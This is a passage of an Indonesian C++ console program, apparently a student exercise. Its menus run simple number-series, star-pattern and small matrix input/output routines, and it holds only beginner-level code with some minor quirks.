            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;deret_bilangan_baris_ke_10();cout << endl;cout << endl;
        }
		else if(pilihan == 4)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Dasar >> Deret Bilangan Ganjil" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;deret_bilangan_ganjil();cout << endl;cout << endl;
        }
		else if(pilihan == 5)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Dasar >> Deret Bilangan Genap 20-100 yang Habis Dibagi 5" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;deret_bilangan_genap_20_sampai_100_yang_habis_dibagi_5();cout << endl;cout << endl;
        }
		else if(pilihan == 6)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Dasar >> Deret Bilangan Prima 1-100" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;deret_bilangan_prima_1_sampai_100();cout << endl;cout << endl;
        }
		else if(pilihan == 7)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Dasar >> Deret Bilangan Tambah 2" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;deret_bilangan_tambah_2();cout << endl;cout << endl;
        }
		else if(pilihan == 8)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Dasar >> Deret Bintang 1" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;deret_bintang_1();cout << endl;cout << endl;
        }
		else if(pilihan == 9)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Dasar >> Deret Bintang 2" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;deret_bintang_2();cout << endl;cout << endl;
        }
        else{goto choosing_in_mapi;}
    }
    else if(pilihan == "GOHOME"){system("cls");main_program();}
    else{goto program_dasar;}
    return 0;
}
int matriks_array()
{
    matriks_array:system("cls");string pilihan;
    cout << "Selamat Datang di Program Matriks Ordo" << endl;
    cout << "Silahkan Pilih tipe Matriks Ordo : " << endl;
    cout << "1.Matriks Ordo 2x2" << endl;
    cout << "2.Matriks Ordo 3x2" << endl;
    cout << "3.Matriks Ordo 2x3" << endl;
    cout << "4.Matriks Ordo 1x3" << endl;
    cout << "5.Matriks Ordo 3x1" << endl;
    cout << endl;
    cout << "Masukkan Pilihan [MAPI] / Lihat List di Program Dasar [PRODAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "MAPI")
    {
        int pilihan;cout << endl;choosing_in_mapi:
        cout << "Masukkan Pilihan : ";cin>>pilihan;
        if(pilihan == 1)
        {
            matriks_a:system("cls");string pilihan;
            typedef int matriks[2][2];matriks A;int j,k;
            cout << "Matriks A : " << endl;
            for(j=0;j<2;j++){for(k=0;k<2;k++){cout << "Masukkan nilai pada baris "<<j<<" kolom "<<k<< " = " ;cin>>A [j] [k];}}
            for(j=0;j<2;j++){for(k=0;k<2;k++){cout << "["<<j<<"]["<<k<< "] = "<< A [j] [k] << endl;}}
            cout << endl;choosing_in_matriks_a:
            cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Matriks Array [MA] / Lihat List di Program Dasar [PRODAS] / Go Home [GOHOME] : ";cin>>pilihan;
            if(pilihan == "JKPI"){system("cls");goto matriks_a;}
            else if(pilihan == "MA"){system("cls");goto matriks_array;}
            else if(pilihan == "PRODAS"){system("cls");program_dasar();}
            else if(pilihan == "GOHOME"){system("cls");main_program();}
            else{goto choosing_in_matriks_a;}return 0;
        }
        else if(pilihan == 2)
        {
            matriks_b:system("cls");string pilihan;
            typedef int matriks[3][2];matriks B;int j,k;
            cout << "Matriks B : " << endl;
            for(j=0;j<3;j++){for(k=0;k<2;k++){cout << "Masukkan nilai pada baris "<<j<<" kolom "<<k<< " = " ;cin>>B [j] [k];}}
            for(j=0;j<3;j++){for(k=0;k<2;k++){cout << "["<<j<<"]["<<k<< "] = "<< B [j] [k] << endl;}}
            cout << endl;choosing_in_matriks_b:
            cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Matriks Array [MA] / Lihat List di Program Dasar [PRODAS] / Go Home [GOHOME] : ";cin>>pilihan;
            if(pilihan == "JKPI"){system("cls");goto matriks_b;}
            else if(pilihan == "MA"){system("cls");goto matriks_array;}
            else if(pilihan == "PRODAS"){system("cls");program_dasar();}
            else if(pilihan == "GOHOME"){system("cls");main_program();}
            else{goto choosing_in_matriks_b;}return 0;
        }
        else if(pilihan == 3)
        {
            matriks_c:system("cls");string pilihan;
            typedef int matriks[2][3];matriks C;int j,k;
            cout << "Matriks C : " << endl;
            for(j=0;j<2;j++){for(k=0;k<3;k++){cout << "Masukkan nilai pada baris "<<j<<" kolom "<<k<< " = " ;cin>>C [j] [k];}}
            for(j=0;j<2;j++){for(k=0;k<3;k++){cout << "["<<j<<"]["<<k<< "] = "<< C [j] [k] << endl;}}
            cout << endl;choosing_in_matriks_c:
            cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Matriks Array [MA] / Lihat List di Program Dasar [PRODAS] / Go Home [GOHOME] : ";cin>>pilihan;
            if(pilihan == "JKPI"){system("cls");goto matriks_c;}
            else if(pilihan == "MA"){system("cls");goto matriks_array;}
            else if(pilihan == "PRODAS"){system("cls");program_dasar();}
            else if(pilihan == "GOHOME"){system("cls");main_program();}
            else{goto choosing_in_matriks_c;}return 0;
        }
        else if(pilihan == 4)
        {
            matriks_d:system("cls");string pilihan;
            typedef int matriks[1][3];matriks D;int j,k;
            cout << "Matriks D : " << endl;
            for(j=0;j<1;j++){for(k=0;k<3;k++){cout << "Masukkan nilai pada baris "<<j<<" kolom "<<k<< " = " ;cin>>D [j] [k];}}
            for(j=0;j<1;j++){for(k=0;k<3;k++){cout << "["<<j<<"]["<<k<< "] = "<< D [j] [k] << endl;}}
            cout << endl;choosing_in_matriks_d:
            cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Matriks Array [MA] / Lihat List di Program Dasar [PRODAS] / Go Home [GOHOME] : ";cin>>pilihan;
            if(pilihan == "JKPI"){system("cls");goto matriks_d;}
            else if(pilihan == "MA"){system("cls");goto matriks_array;}
            else if(pilihan == "PRODAS"){system("cls");program_dasar();}
            else if(pilihan == "GOHOME"){system("cls");main_program();}
            else{goto choosing_in_matriks_d;}return 0;
        }
        else if(pilihan == 5)
        {
            matriks_e:system("cls");string pilihan;
            typedef int matriks[3][1];matriks E;int j,k;
            cout << "Matriks E : " << endl;
            for(j=0;j<3;j++){for(k=0;k<1;k++){cout << "Masukkan nilai pada baris "<<j<<" kolom "<<k<< " = " ;cin>>E [j] [k];}}
            for(j=0;j<3;j++){for(k=0;k<1;k++){cout << "["<<j<<"]["<<k<< "] = "<< E [j] [k] << endl;}}
            cout << endl;choosing_in_matriks_e:
            cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Matriks Array [MA] / Lihat List di Program Dasar [PRODAS] / Go Home [GOHOME] : ";cin>>pilihan;
            if(pilihan == "JKPI"){system("cls");goto matriks_e;}
            else if(pilihan == "MA"){system("cls");goto matriks_array;}
            else if(pilihan == "PRODAS"){system("cls");program_dasar();}
            else if(pilihan == "GOHOME"){system("cls");main_program();}
            else{goto choosing_in_matriks_e;}return 0;
        }
        else{goto choosing_in_mapi;}
    }
    else if(pilihan == "PRODAS"){system("cls");program_dasar();}
    else if(pilihan == "GOHOME"){system("cls");main_program();}
    else{goto matriks_array;}
}
int deret_bilangan_1_sampai_5_berulang()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	main()
	{
	 int i,j;
	 for(i=1;i<=5;i=i++){for(j=1;j<=i;j++){printf("%d ",i);}}
	 getch();
	}
	*/
	deret_bilangan_1_sampai_5_berulang:system("cls");string pilihan;
	int i,j;
	for(i=1;i<=5;i=i++){for(j=1;j<=i;j++){printf("%d ",i);}}
	getch();
	cout << endl;
	cout << endl;choosing_in_deret_bilangan_1_sampai_5_berulang:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PRODAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto deret_bilangan_1_sampai_5_berulang;}
	else if(pilihan == "PRODAS"){system("cls");program_dasar();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_deret_bilangan_1_sampai_5_berulang;}return 0;
}
int deret_bilangan_baris_ke_10()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	main()
	{ int i,m,n,c;
	clrscr();
	printf("Masukkan Jumlah Baris: "); scanf("%d",&m);
	c=0;
	for (i=1;i<=m;i++){
		 printf("\n");
	 for(n=1;n<=i;n++){
		   c=c+1;
		   printf("%d ",c);
		   printf(" ");
		   }
		  }

	 getch();
	}
	*/
	deret_bilangan_baris_ke_10:system("cls");string pilihan;
	int i,m,n,c;
	system("cls");
	printf("Masukkan Jumlah Baris: "); scanf("%d",&m);
	c=0;
	for (i=1;i<=m;i++){
		 printf("\n");
	for(n=1;n<=i;n++){
		   c=c+1;
		   printf("%d ",c);
		   printf(" ");
		   }
		  }

	getch();
	cout << endl;
	cout << endl;choosing_in_deret_bilangan_baris_ke_10:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PRODAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto deret_bilangan_baris_ke_10;}
	else if(pilihan == "PRODAS"){system("cls");program_dasar();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_deret_bilangan_baris_ke_10;}return 0;
}
int deret_bilangan_ganjil()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	main()
	{
	 int i;
	 for(i=1;i<=10;i=i+2){printf("%d ",i);}
	 getch();
	}
	*/
	deret_bilangan_ganjil:system("cls");string pilihan;
	int i;
	for(i=1;i<=10;i=i+2){printf("%d ",i);}
	getch();
	cout << endl;
	cout << endl;choosing_in_deret_bilangan_ganjil:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PRODAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto deret_bilangan_ganjil;}
	else if(pilihan == "PRODAS"){system("cls");program_dasar();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_deret_bilangan_ganjil;}return 0;
}
int deret_bilangan_genap_20_sampai_100_yang_habis_dibagi_5()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	main()
	{ int i,n,c;
	clrscr();
	puts("BILANGAN GENAP YANG HABIS DIBAGI 5 (20-100)");
	n=100;
	c=10;
	for(i=1;i<n;i++){
	c=c+1;
	 if(c%5==0 && c%2==0)
	 printf("%d ",c);
	 }
	 getch();
	}
	*/
	deret_bilangan_genap_20_sampai_100_yang_habis_dibagi_5:system("cls");string pilihan;
	int i,n,c;
	system("cls");
	puts("BILANGAN GENAP YANG HABIS DIBAGI 5 (20-100)");
	n=100;
	c=10;
	for(i=1;i<n;i++){
	c=c+1;
	 if(c%5==0 && c%2==0)
	 printf("%d ",c);
	 }
	getch();
	cout << endl;
	cout << endl;choosing_in_deret_bilangan_genap_20_sampai_100_yang_habis_dibagi_5:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PRODAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto deret_bilangan_genap_20_sampai_100_yang_habis_dibagi_5;}
	else if(pilihan == "PRODAS"){system("cls");program_dasar();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_deret_bilangan_genap_20_sampai_100_yang_habis_dibagi_5;}return 0;
}
int deret_bilangan_prima_1_sampai_100()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	main()
	{ int i,n,cek,a;
	clrscr();
	printf("Masukkan angka: "); scanf("%d",&a);
	i=1;
	for (i=1;i<=a;i++)
	{ cek=0;
	for (n=2;n<i;n++){
	if(i%n==0){
	   cek=1;
	   }
	  }
	  if (cek==0){
	  printf("%d ",i);
	  }
	 }
	 getch();
	}
	*/
	deret_bilangan_prima_1_sampai_100:system("cls");string pilihan;
	int i,n,cek,a;
	system("cls");
	printf("Masukkan angka: "); scanf("%d",&a);
	i=1;
	for (i=1;i<=a;i++)
	{ cek=0;
	for (n=2;n<i;n++){
	if(i%n==0){
	   cek=1;
	   }
	  }
	  if (cek==0){
	  printf("%d ",i);
	  }
	 }
	getch();
	cout << endl;
